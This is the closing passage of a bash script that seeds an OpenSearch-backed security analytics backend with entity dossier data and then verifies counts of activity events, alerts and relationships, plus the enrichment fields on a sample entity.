      GAPS='[]'
      ;;
  esac

  ${CURL_OS} -X POST "${OS_URL}/${ENTITY_IDX}/_update/${ENT_ID}" \
    -H "Content-Type: application/json" \
    -d "{\"doc\":{\"source_coverage\":{\"sources\":${SOURCES},\"gaps\":${GAPS}}},\"doc_as_upsert\":true}" \
    2>/dev/null > /dev/null
  (( COVERAGE_COUNT++ ))
done
ok "Source coverage added to ${COVERAGE_COUNT} entities"

# =============================================================================
# STEP 9: Verification summary
# =============================================================================
header "Step 9: Verification"

echo ""
info "Checking activity event counts..."
for IDX in v3-hive-log-cwm v3-hive-log-workmates1; do
  COUNT=$(${CURL_OS} -s "${OS_URL}/${IDX}/_count" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null \
    | grep -o '"count":[0-9]*' | cut -d: -f2)
  ok "  ${IDX}: ${COUNT:-0} activity events"
done

info "Checking alert counts..."
for IDX in v3-hive-alert-cwm v3-hive-alert-workmates1; do
  COUNT=$(${CURL_OS} -s "${OS_URL}/${IDX}/_count" \
    -H "Content-Type: application/json" \
    -d '{"query":{"term":{"event.dataset":"entity-dossier-seed"}}}' 2>/dev/null \
    | grep -o '"count":[0-9]*' | cut -d: -f2)
  ok "  ${IDX}: ${COUNT:-0} alerts"
done

info "Checking relationship counts..."
for IDX in v3-hive-relationship-cwm v3-hive-relationship-workmates1; do
  COUNT=$(${CURL_OS} -s "${OS_URL}/${IDX}/_count" 2>/dev/null \
    | grep -o '"count":[0-9]*' | cut -d: -f2)
  ok "  ${IDX}: ${COUNT:-0} relationships"
done

info "Checking entity enrichment (sample: ent-host-eng-srv-001)..."
ENTITY_DOC=$(${CURL_OS} -s "${OS_URL}/v3-hive-entity-cwm/_doc/ent-host-eng-srv-001" 2>/dev/null)
if echo "$ENTITY_DOC" | grep -q "risk_drivers"; then
  ok "  risk_drivers: present"
else
  warn "  risk_drivers: NOT FOUND"
fi
if echo "$ENTITY_DOC" | grep -q "risk_history"; then
  ok "  risk_history: present"
else
  warn "  risk_history: NOT FOUND"
fi
if echo "$ENTITY_DOC" | grep -q "baseline_metrics"; then
  ok "  baseline_metrics: present"
else
  warn "  baseline_metrics: NOT FOUND"
fi
if echo "$ENTITY_DOC" | grep -q "source_coverage"; then
  ok "  source_coverage: present"
else
  warn "  source_coverage: NOT FOUND"
fi

echo ""
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}  ✓ Sprint 46 Entity Dossier seed complete!${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
info "Summary:"
info "  • 40 entities enriched with dossier data"
info "  • ~${ACTIVITY_COUNT} activity events seeded across v3-hive-log-*"
info "  • ~${ALERT_TOTAL} alerts seeded with MITRE technique mappings"
info "  • ${REL_COUNT} relationship edges with evidence entries"
info "  • Each entity has: risk_drivers, risk_history, baseline_metrics, source_coverage"
echo ""
info "Next: start backend and verify dossier endpoint:"
info "  curl -s http://localhost:8088/api/ha-entities/ent-host-eng-srv-001/dossier | jq ."
echo ""
